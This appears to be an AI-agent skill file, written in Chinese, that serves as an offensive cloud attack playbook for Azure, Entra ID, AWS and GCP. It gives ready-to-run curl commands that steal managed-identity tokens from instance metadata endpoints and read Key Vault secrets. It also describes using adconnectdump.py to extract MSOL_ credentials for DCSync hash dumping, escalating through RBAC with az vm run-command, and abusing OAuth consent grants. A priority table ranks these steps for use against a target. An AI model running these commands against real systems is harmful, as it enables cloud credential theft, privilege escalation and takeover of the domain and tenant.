---
name: 'cloud-attacks'
description: '云攻击面：Azure IMDS→Entra ID→CVE-2025-55241 Actor Token→RBAC提权→AD Connect横向→AWS/GCP速查'
whenToUse: '目标在云上（Azure/Entra ID/AWS/GCP）时：IMDS→Entra ID→Actor Token→RBAC 提权→AD Connect 横向。'
disable-model-invocation: true
metadata: { domain: cloud, tier: T2 }
---

# 云攻击面（Azure / Entra ID）

> 🔴 **填补 aws-attack-surface 的空白。Azure/Entra ID 是 2025-2026 最热门云攻击面。**

## 0. 前置：识别云环境

```
# Azure
[ ] env | grep -iE 'AZURE\|MSI\|IMDS\|IDENTITY'
[ ] curl -s -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
[ ] whoami → AzureAD\
[ ] dir "C:\Program Files\Microsoft Monitoring Agent"  # Log Analytics / ARC

# Entra ID (Azure AD)
[ ] 域控安装了 Azure AD Connect → 本地 AD → 云横向
[ ] 🔴 adconnectdump.py DOMAIN/ADMIN@CONNECT-SERVER → 提取 MSOL_ 凭据 → DCSync → 本地 DA = 云 GA
```

---

## 1. Azure 元数据 API (IMDS)

```
# 获取 Azure Resource Manager token
AZ_TOKEN=`curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`

# 用 token 调 Azure REST API
curl -s -H "Authorization: Bearer $AZ_TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2019-06-01"
curl -s -H "Authorization: Bearer $AZ_TOKEN" \
  "https://management.azure.com/subscriptions/<SUB_ID>/resources?api-version=2019-10-01"

# Key Vault 读取 (🔴 必须用 vault.azure.net 专用 token!)
VAULT_TOKEN=`curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
curl -s -H "Authorization: Bearer $VAULT_TOKEN" \
  "https://<vault>.vault.azure.net/secrets/<secret>?api-version=7.2"
```

---

## 2. Entra ID (Azure AD) 攻击

### 2.1 Azure AD Connect → 云横向

```
# 本地 AD → Entra ID 横向
# 🔴 工具: adconnectdump.py (dirkjanm) — GitHub 可获取
# adconnectdump.py DOMAIN/ADMIN-USER@CONNECT-SERVER-IP
# → 提取 MSOL_ 账户凭据 → 该账户有 DCSync 权限 → DCSync → 本地 DA = 云 GA

[ ] 找到 AD Connect / Entra Connect 服务器
[ ] C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll 存在?
[ ] adconnectdump.py → 提取 encrypted_configuration → 解密 MSOL_ 密码
[ ] 拿到 MSOL_ 密码 → DCSync → 所有域用户 NT hash
```

### 2.2 CVE-2025-55241 Actor Token (CVSS 10.0, 已修复)

```
# 发现者: Dirk-jan Mollema (2025-07)
# 原理: Actor Token (内部 S2S 模拟令牌) + 旧 Graph API 不验证来源 tenant
# 影响: 任意租户 Global Admin — 绕过 MFA/CA/日志
# 状态: Microsoft 2025-09 服务端修复, 无需客户操作
```

### 2.3 其他 Entra ID 攻击面

```
# 应用注册 & Service Principals
Get-MgServicePrincipal → 有高权限 SPN → 用其权限
Get-MgApplication → 应用密钥/证书 → 窃取密码

# OAuth 权限滥用
Get-MgOauth2PermissionGrant → Delegated vs Application permissions
→ 恶意 OAuth 应用注册 (Illicit Consent Grant)

# B2B 信任
Get-MgCrossTenantAccessPolicy → 跨租户信任配置 → 跳板
```

---

## 3. Azure RBAC 提权

```
# VM 上的 MI (Managed Identity) → 获取 token → 查 role assignments

# 常见提权路径:
[ ] VM Contributor    → az vm run-command invoke → RunPowerShellScript → SYSTEM
[ ] Key Vault Reader  → 读 secrets/certs → 横向
[ ] Storage Blob Data → 读源码/config → 发现更多凭据
[ ] Logic App Contributor → 修改 workflow → 触发执行
[ ] Automation Contributor → 创建/修改 Runbook → 执行脚本
```

---

## 4. AWS 攻击面 (补充)

> 详见 aws-attack-surface skill

```
# 元数据
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>

# IMDSv2
AWS_TOKEN=`curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl -s -H "X-aws-ec2-metadata-token: $AWS_TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE>
```

---

## 5. GCP 攻击面

```
# 元数据
GCP_TOKEN=`curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google" | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])"`
curl -s -H "Authorization: Bearer $GCP_TOKEN" \
  "https://www.googleapis.com/compute/v1/projects"
```

---

## 6. 🆕 云关键资源（2026 重点）

```
# AI/ML 资源 → SageMaker / Azure ML / Vertex AI → 训练脚本凭据注入
# CI/CD 即服务 → GitHub Actions / CodeBuild → pipeline 注入
# Serverless → Lambda / Azure Functions → 密钥硬编码 → IAM Role 横向
```

---

## 快速优先级

| 优先级 | 条件 | 方法 |
|--------|------|------|
| 🔴 1 | curl IMDS 成功 | 获取 token → 查 role → 横向 |
| 🔴 2 | AD Connect 服务器 | adconnectdump.py 提取 MSOL_ → DCSync |
| 🔴 3 | VM Managed Identity | 枚举 role → az vm run-command |
| 🔴 4 | Key Vault 权限 | 读 secrets/certs |
| 🟠 5 | AWS/GCP 元数据 | IMDSv2 → STS → IAM 横向 |
| 🟡 6 | Logic App / Automation | 修改 workflow → RCE |
